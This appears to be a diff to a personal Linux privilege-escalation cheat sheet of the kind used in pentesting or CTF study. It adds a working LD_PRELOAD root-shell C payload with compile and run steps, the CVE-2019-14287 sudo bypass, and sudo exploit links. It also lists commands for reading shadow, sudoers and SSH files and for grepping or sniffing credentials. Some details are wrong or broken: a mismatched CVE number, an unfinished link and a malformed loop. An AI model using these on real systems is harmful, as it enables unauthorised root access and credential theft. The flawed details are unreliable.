@@ -10,21 +10,24 @@
     ps -aux | grep root 
     
     netstat -antp; arp -a 
-    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " "
+    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " " 
+    cat /etc/hosts 
 ## Scripts
 run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels, [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [linenum](https://github.com/rebootuser/LinEnum) 
 ## Checklists / What to look for
 [gtfobins](https://gtfobins.github.io/) 
 - [ ] Fully functional tty? 
 - [ ] su root? (no password, root, password) 
-- [ ] Sudo binaries? (sudo -l, cat /etc/sudoers)
+- [ ] Sudo binaries or exploits? (sudo -l, cat /etc/sudoers - check gtfobins)
 - [ ] Exploitable cronjobs? 
 - [ ] Weird SUID binaries?   
 - [ ] Services running as root?, services only available to localhost?
 - [ ] Passwords / config files?  
-- [ ] Is the kernel vulnerable? (last resort)
+- [ ] Is the kernel vulnerable? (last resort) 
+
 [g0tm1lk checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 
 [Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)  
+[Tiberius Linux Privilige Escalation](
 
 # Exploits
 ## Upgrade to a fully functional TTY 
@@ -32,6 +35,32 @@ run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with incr
     echo os.system('/bin/bash') 
     /bin/sh -i 
     /bin/bash -p 
+## Sudo exploits 
+sudo -V 
+## Sudo LD_PRELOAD 
+sudo -l, see env_keep+=LD_PRELOAD 
+
+    #include <stdio.h> 
+    #include <sys/types.h>
+    #include <stdlib.h>
+    void _init(){
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+    } 
+    
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c 
+
+sudo LD_PRELOAD=/tmp/preload.so [sudo binary] 
+
+## CVE-2019-14287 
+sudo -l, see (ALL,!root) 
+    sudo -u#-1 [binary escape]  
+## CVE-2019-16634 
+sudo su root, type password, see ******: passwd feedback enabled 
+[proof of concept](https://github.com/saleemrashid/sudo-cve-2019-18634) 
+## CVE-2021-3156 - Baron Samedit 
+[proof of concept](https://github.com/stong/CVE-2021-3156) 
 ## Cronjobs    
 look for scripts you can write to or exploit  
 
@@ -47,11 +76,11 @@ look for scripts you can write to or exploit
     }
 ## Services Running as Root / Services Only Running Locally
     ps -aux | grep root
-    mysql running as root exploit 
+    mysql running as root [exploit](https://www.exploit-db.com/exploits/1518)  
     ftp, telnet - tcpdump to sniff creds??
 ## Passwords / config files 
     find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \; 
-    /etc/passwd, /etc/shadow, /etc/group  read or write?? 
+    /etc/passwd, /etc/shadow, /etc/sudoers  read or write?? 
     cat ~/.ssh  
 ## Kernel Exploits 
     uname -a  
